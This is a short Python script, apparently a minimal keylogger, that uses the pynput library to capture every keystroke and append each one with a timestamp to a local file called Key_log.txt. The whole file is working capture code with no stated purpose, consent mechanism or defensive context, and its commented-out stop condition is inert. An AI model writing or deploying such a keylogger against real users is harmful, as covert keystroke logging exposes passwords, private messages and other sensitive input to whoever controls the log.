from pynput.keyboard import Key, Listener
import logging

Log_dir = ""
logging.basicConfig(filename=(Log_dir + "Key_log.txt"), level= logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(Key):
    logging.info(str(Key))
    #if key == Key.esc:
        # Stop listener
        #return false

with Listener(on_press=on_press) as listener:
        listener.join()




  












